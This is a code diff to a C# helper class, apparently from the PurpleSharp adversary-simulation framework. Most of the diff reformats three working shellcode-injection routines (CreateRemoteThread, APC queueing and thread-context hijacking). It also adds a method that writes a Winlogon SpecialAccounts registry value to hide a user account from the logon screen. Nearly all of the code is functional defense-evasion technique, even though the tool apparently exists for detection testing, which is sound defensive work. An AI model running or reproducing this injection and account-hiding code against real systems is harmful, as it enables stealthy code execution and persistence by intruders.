@@ -4,12 +4,12 @@ using System.Diagnostics;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using Microsoft.Win32;
 
 namespace PurpleSharp.Simulations
 {
     class DefenseEvasionHelper
     {
-
         const uint MEM_COMMIT = 0x00001000;
         const UInt32 PAGE_EXECUTE_READWRITE = 0x40;
         const UInt32 PAGE_EXECUTE_READ = 0x20;
@@ -22,34 +22,44 @@ namespace PurpleSharp.Simulations
         public static void ProcInjection_CreateRemoteThread(byte[] shellcode, Process proc, Lib.Logger logger)
         {
             logger.TimestampInfo(String.Format("Calling OpenProcess on PID:{0}", proc.Id));
-            IntPtr procHandle = WinAPI.OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
+            IntPtr procHandle =
+                WinAPI.OpenProcess(
+                    PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
+                    PROCESS_VM_READ, false, proc.Id);
             Int32 size = shellcode.Length;
             logger.TimestampInfo(String.Format("Calling VirtualAllocEx on PID:{0}", proc.Id));
-            IntPtr spaceAddr = WinAPI.VirtualAllocEx(procHandle, new IntPtr(0), (uint)size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            IntPtr spaceAddr = WinAPI.VirtualAllocEx(procHandle, new IntPtr(0), (uint)size, MEM_COMMIT,
+                PAGE_EXECUTE_READWRITE);
 
             UIntPtr bytesWritten;
             IntPtr size2 = new IntPtr(shellcode.Length);
             logger.TimestampInfo(String.Format("Calling WriteProcessMemory on PID:{0}", proc.Id));
             bool bWrite = WinAPI.WriteProcessMemory(procHandle, spaceAddr, shellcode, (uint)size2, out bytesWritten);
             logger.TimestampInfo(String.Format("Calling CreateRemoteThread on PID:{0}", proc.Id));
-            WinAPI.CreateRemoteThread(procHandle, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
+            WinAPI.CreateRemoteThread(procHandle, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(),
+                new IntPtr(0));
         }
 
         public static void ProcInjection_APC(byte[] shellcode, Process proc, Lib.Logger logger)
         {
             logger.TimestampInfo(String.Format("Calling OpenProcess on PID:{0}", proc.Id));
-            IntPtr procHandle = WinAPI.OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
+            IntPtr procHandle =
+                WinAPI.OpenProcess(
+                    PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
+                    PROCESS_VM_READ, false, proc.Id);
 
             //IntPtr procHandle = WinAPI.OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
             Int32 size = shellcode.Length;
             logger.TimestampInfo(String.Format("Calling VirtualAllocEx on PID:{0}", proc.Id));
-            IntPtr spaceAddr = WinAPI.VirtualAllocEx(procHandle, new IntPtr(0), (uint)size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            IntPtr spaceAddr = WinAPI.VirtualAllocEx(procHandle, new IntPtr(0), (uint)size, MEM_COMMIT,
+                PAGE_EXECUTE_READWRITE);
             UIntPtr bytesWritten;
             IntPtr size2 = new IntPtr(shellcode.Length);
             logger.TimestampInfo(String.Format("Calling WriteProcessMemory on PID:{0}", proc.Id));
             bool bWrite = WinAPI.WriteProcessMemory(procHandle, spaceAddr, shellcode, (uint)size2, out bytesWritten);
             uint oldProtect = 0;
-            bWrite = WinAPI.VirtualProtectEx(procHandle, spaceAddr, shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
+            bWrite = WinAPI.VirtualProtectEx(procHandle, spaceAddr, shellcode.Length, PAGE_EXECUTE_READ,
+                out oldProtect);
 
             //TODO: do we need to do it for all threads ?
             foreach (ProcessThread thread in proc.Threads)
@@ -63,12 +73,15 @@ namespace PurpleSharp.Simulations
         //credits to https://github.com/pwndizzle/c-sharp-memory-injection
         public static void ProcInjection_ThreadHijack(byte[] shellcode, Process proc, Lib.Logger logger)
         {
-
             logger.TimestampInfo(String.Format("Calling OpenProcess on PID:{0}", proc.Id));
-            IntPtr procHandle = WinAPI.OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
+            IntPtr procHandle =
+                WinAPI.OpenProcess(
+                    PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
+                    PROCESS_VM_READ, false, proc.Id);
             Int32 size = shellcode.Length;
             logger.TimestampInfo(String.Format("Calling VirtualAllocEx on PID:{0}", proc.Id));
-            IntPtr spaceAddr = WinAPI.VirtualAllocEx(procHandle, new IntPtr(0), (uint)size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            IntPtr spaceAddr = WinAPI.VirtualAllocEx(procHandle, new IntPtr(0), (uint)size, MEM_COMMIT,
+                PAGE_EXECUTE_READWRITE);
             UIntPtr bytesWritten;
             IntPtr size2 = new IntPtr(shellcode.Length);
             logger.TimestampInfo(String.Format("Calling WriteProcessMemory on PID:{0}", proc.Id));
@@ -85,12 +98,12 @@ namespace PurpleSharp.Simulations
 
             Structs.CONTEXT64 tContext = new Structs.CONTEXT64();
             tContext.ContextFlags = Structs.CONTEXT_FLAGS.CONTEXT_FULL;
-            
+
             if (WinAPI.GetThreadContext(pOpenThread, ref tContext))
             {
                 logger.TimestampInfo(String.Format("Current EIP: {0}", tContext.Rip));
             }
-            
+
             tContext.Rip = (ulong)spaceAddr.ToInt64();
             logger.TimestampInfo(String.Format("Calling SetThreadContext on threadId:{0}", proc.Threads[0].Id));
             WinAPI.SetThreadContext(pOpenThread, ref tContext);
@@ -105,8 +118,24 @@ namespace PurpleSharp.Simulations
             {
                 logger.TimestampInfo(String.Format("New EIP : {0}", tContext.Rip));
             }
+
             logger.TimestampInfo(String.Format("Calling ResumeThread on threadId:{0}", proc.Threads[0].Id));
             WinAPI.ResumeThread(pOpenThread);
+        }
+
+        public static void HiddenUser(string username, Lib.Logger logger)
+        {
+            // 注册表路径
+            string key = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList";
+            RegistryKey regKey = Registry.LocalMachine.OpenSubKey(key, true);
+            if (regKey == null)
+            {
+                // 如果注册表项不存在，创建注册表项
+                regKey = Registry.LocalMachine.CreateSubKey(key);
+                // 设置指定用户为隐藏用户
+                regKey.SetValue(username, 0, RegistryValueKind.DWord);
+                logger.TimestampInfo(@"Created Regkey: HKLM\" + " " + key + " " + username + " " + 0);
+            }
         }
     }
 }
